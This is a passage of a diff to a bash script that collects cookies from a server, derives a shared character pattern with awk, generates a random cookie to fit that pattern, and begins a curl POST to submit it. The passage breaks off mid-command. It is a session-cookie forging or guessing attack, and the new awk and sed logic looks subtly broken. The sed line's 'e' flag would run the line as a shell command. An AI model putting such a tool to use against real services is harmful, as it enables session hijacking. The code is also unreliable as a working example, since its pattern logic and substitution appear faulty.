@@ -23,15 +23,37 @@ done
 echo -e "\n--- All Retrieved Cookies ---"
 printf "%s\n" "${cookies[@]}"
 
-# Analyze unique cookies
+# Identify unique cookies
 unique_cookies=($(printf "%s\n" "${cookies[@]}" | sort | uniq))
 echo -e "\n--- Unique Cookies ---"
 printf "%s\n" "${unique_cookies[@]}"
 
-# Detect possible patterns
+# Detect patterns
 echo -e "\n--- Pattern Analysis ---"
 if [[ ${#unique_cookies[@]} -gt 1 ]]; then
-    echo "Possible unique patterns detected. Review the unique cookies for common elements."
+    # Extract common patterns
+    pattern=$(printf "%s\n" "${unique_cookies[@]}" | awk '
+    {
+        for (i = 1; i <= length($0); i++) {
+            char[i] = char[i] (NR == 1 ? substr($0, i, 1) : (substr($0, i, 1) == substr(first, i, 1) ? substr($0, i, 1) : "?"))
+        }
+        if (NR == 1) first = $0
+    }
+    END {
+        for (i = 1; i <= length(first); i++) printf char[i]
+        printf "\n"
+    }')
+    echo "Detected pattern: $pattern"
 else
-    echo "No patterns detected. All cookies appear identical."
+    echo "No discernible patterns. All cookies are identical."
+    pattern="${unique_cookies[0]}"
 fi
+
+# Generate a random cookie based on the detected pattern
+echo -e "\n--- Generating Random Cookie ---"
+random_cookie=$(echo "$pattern" | sed 's/?/$(tr -dc "a-zA-Z0-9" < /dev/urandom | head -c 1)/ge')
+echo "Generated cookie: $random_cookie"
+
+# Run the POST command
+echo -e "\n--- Executing POST Request ---"
+response=$(curl -X
